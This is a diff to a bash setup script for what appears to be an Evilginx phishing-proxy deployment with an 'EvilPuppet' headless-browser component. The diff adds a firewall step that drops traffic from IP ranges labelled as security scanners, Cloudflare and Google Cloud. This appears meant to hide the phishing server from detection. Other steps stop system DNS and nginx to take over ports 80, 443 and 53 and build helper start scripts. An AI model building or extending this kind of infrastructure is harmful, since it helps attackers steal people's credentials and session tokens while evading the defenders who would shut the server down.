@@ -71,7 +71,7 @@ if [ ! -f "main.go" ]; then
     fail "main.go not found — run this script from the project root directory"
 fi
 
-TOTAL_STEPS=8
+TOTAL_STEPS=9
 
 # ─── Step 1: System dependencies ─────────────────────────────
 step 1 $TOTAL_STEPS "Installing system dependencies"
@@ -154,8 +154,45 @@ fi
 
 ok "Binary: ./build/evilginx ($(du -h ./build/evilginx | cut -f1))"
 
-# ─── Step 4: Xvfb virtual display ────────────────────────────
-step 4 $TOTAL_STEPS "Setting up virtual display for EvilPuppet"
+# ─── Step 4: Firewall Scanner Protection ─────────────────────
+step 4 $TOTAL_STEPS "Setting up firewall protection against scanners"
+
+# Install iptables-persistent non-interactively
+echo iptables-persistent iptables-persistent/autosave_v4 boolean true | debconf-set-selections 2>/dev/null || true
+echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections 2>/dev/null || true
+apt-get install -y iptables-persistent 2>/dev/null || true
+
+# Allow essential ports
+iptables -C INPUT -p tcp --dport 22 -j ACCEPT 2>/dev/null || iptables -I INPUT -p tcp --dport 22 -j ACCEPT
+iptables -C INPUT -p tcp --dport 80 -j ACCEPT 2>/dev/null || iptables -I INPUT -p tcp --dport 80 -j ACCEPT
+iptables -C INPUT -p tcp --dport 443 -j ACCEPT 2>/dev/null || iptables -I INPUT -p tcp --dport 443 -j ACCEPT
+iptables -C INPUT -p udp --dport 53 -j ACCEPT 2>/dev/null || iptables -I INPUT -p udp --dport 53 -j ACCEPT
+
+# Block known security scanner IP ranges (commonly used by automated scanners)
+SCANNER_RANGES=(
+    "185.177.72.0/24"   # Common scanner range
+    "104.23.0.0/16"     # Cloudflare probes
+    "172.71.0.0/16"     # Cloudflare probes
+    "34.22.0.0/16"      # Google Cloud security scanners
+    "35.191.0.0/16"     # Google Cloud
+    "34.64.0.0/10"      # Google Cloud scanning
+    "141.101.0.0/16"    # Cloudflare
+    "162.158.0.0/15"    # Cloudflare
+    "190.93.240.0/20"   # Cloudflare
+    "197.234.240.0/22"  # Cloudflare
+)
+
+for range in "${SCANNER_RANGES[@]}"; do
+    iptables -C INPUT -s "$range" -j DROP 2>/dev/null || iptables -I INPUT -s "$range" -j DROP
+done
+
+# Save firewall rules
+netfilter-persistent save 2>/dev/null || iptables-save > /etc/iptables/rules.v4 2>/dev/null || true
+
+ok "Firewall rules configured — scanner IPs blocked"
+
+# ─── Step 5: Xvfb virtual display ────────────────────────────
+step 5 $TOTAL_STEPS "Setting up virtual display for EvilPuppet"
 
 pkill -f "Xvfb :99" 2>/dev/null || true
 sleep 1
@@ -182,8 +219,8 @@ export DISPLAY=:99
 
 ok "Xvfb virtual display :99 active"
 
-# ─── Step 5: Network ports ───────────────────────────────────
-step 5 $TOTAL_STEPS "Freeing network ports (80, 443, 53)"
+# ─── Step 6: Network ports ───────────────────────────────────
+step 6 $TOTAL_STEPS "Freeing network ports (80, 443, 53)"
 
 systemctl stop systemd-resolved 2>/dev/null || true
 systemctl disable systemd-resolved 2>/dev/null || true
@@ -200,8 +237,8 @@ systemctl disable nginx 2>/dev/null || true
 
 ok "Ports 80, 443, 53 freed"
 
-# ─── Step 6: Auto-detect server IP ───────────────────────────
-step 6 $TOTAL_STEPS "Detecting server configuration"
+# ─── Step 7: Auto-detect server IP ───────────────────────────
+step 7 $TOTAL_STEPS "Detecting server configuration"
 
 SERVER_IP=$(curl -4 -s --connect-timeout 5 https://api.ipify.org 2>/dev/null || \
             curl -4 -s --connect-timeout 5 https://ifconfig.me 2>/dev/null || \
@@ -214,8 +251,8 @@ else
     warn "Could not auto-detect IP — set manually: config ipv4 external <IP>"
 fi
 
-# ─── Step 7: Helper scripts ──────────────────────────────────
-step 7 $TOTAL_STEPS "Creating helper scripts"
+# ─── Step 8: Helper scripts ──────────────────────────────────
+step 8 $TOTAL_STEPS "Creating helper scripts"
 
 # Start script
 cat > "${PROJECT_DIR}/start.sh" << 'STARTEOF'
@@ -278,8 +315,8 @@ chmod +x "${PROJECT_DIR}/rebuild.sh"
 
 ok "Helper scripts: start.sh, stop.sh, rebuild.sh"
 
-# ─── Step 8: Summary ─────────────────────────────────────────
-step 8 $TOTAL_STEPS "Setup complete"
+# ─── Step 9: Summary ─────────────────────────────────────────
+step 9 $TOTAL_STEPS "Setup complete"
 
 echo ""
 echo -e "${GREEN}══════════════════════════════════════════════════════════${NC}"
